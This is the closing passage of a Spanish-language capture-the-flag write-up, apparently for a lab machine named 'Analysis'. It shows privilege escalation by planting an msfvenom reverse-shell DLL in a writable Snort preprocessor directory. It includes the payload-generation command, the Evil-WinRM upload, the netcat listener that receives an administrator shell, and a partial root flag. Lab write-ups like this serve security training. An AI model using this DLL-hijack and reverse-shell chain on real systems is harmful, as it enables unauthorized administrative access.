</span></span></code></pre></div><p>Mirando la <a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html">documentación</a></p>
<blockquote>
<p>Tells snort to load the dynamic preprocessor shared library (if file is used) or all dynamic preprocessor shared libraries (if directory is used)</p>
</blockquote>
<p>Por lo cual, cuando snort se ejecuta, carga todos los archivos .dll dentro de ese directorio.</p>
<p>También, en el directorio <code>C:\Snort\log</code> podemos ver que se están creando logs cada dos minutos, por lo que podemos deducir que hay una tarea que cada dos minutos se ejecuta por detrás.
<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
<p>Ahora solo hace falta comprobar si tenemos permisos para crear archivos en <code>C:\Snort\lib\snort_dynamicpreprocessor</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Snort\lib&gt; icacls snort_dynamicpre*
</span></span><span style="display:flex;"><span>snort_dynamicpreprocessor AUTORITE NT\SystŠme<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(F)
</span></span><span style="display:flex;"><span>                          BUILTIN\Administrateurs<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(F)
</span></span><span style="display:flex;"><span>                          BUILTIN\Utilisateurs<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(RX)
</span></span><span style="display:flex;"><span>                          BUILTIN\Utilisateurs<span style="color:#960050;background-color:#1e0010">:</span>(I)(CI)(AD)
</span></span><span style="display:flex;"><span>                          BUILTIN\Utilisateurs<span style="color:#960050;background-color:#1e0010">:</span>(I)(CI)(WD)
</span></span><span style="display:flex;"><span>                          CREATEUR PROPRIETAIRE<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(F)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Successfully processed <span style="color:#ae81ff">1</span> files; Failed processing <span style="color:#ae81ff">0</span> files
</span></span></code></pre></div><p>Vemos que el grupo <code>Utilisateurs</code> puede escribir <code>WD -&gt; Write Data</code> y <code>AP -&gt; Append Data</code> añadir datos  y nosotros pertenecemos a este grupo, lo podemos comprobar con <code>whoami /groups</code></p>
<p>Ahora que tenemos el vector de ataque claro..</p>
<p>Podemos probar a crear un archivo .dll malicioso.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$  msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.13 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f dll -a x64 -o shell.dll
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">460</span> bytes
</span></span><span style="display:flex;"><span>Final size of dll file: <span style="color:#ae81ff">9216</span> bytes
</span></span><span style="display:flex;"><span>Saved as: shell.dll
</span></span></code></pre></div><p>Y a subirlo en este directorio.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor&gt; upload shell.dll
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Uploading /home/pointedsec/Desktop/analysis/content/shell.dll to C:\Snort\lib\snort_dynamicpreprocessor\shell.dll
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Data<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">12288</span> bytes of <span style="color:#ae81ff">12288</span> bytes copied
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Upload successful!
</span></span></code></pre></div><p>Después de esperar un rato..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.13<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.179<span style="color:#f92672">]</span> <span style="color:#ae81ff">54068</span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.5329<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>analysis<span style="color:#ae81ff">\a</span>dministrateur
</span></span></code></pre></div><p>Podemos ver la flag de <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Administrateur\Desktop<span style="color:#75715e">&gt;type root.txt</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
</span></span><span style="display:flex;"><span>749dd2480737c7...
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
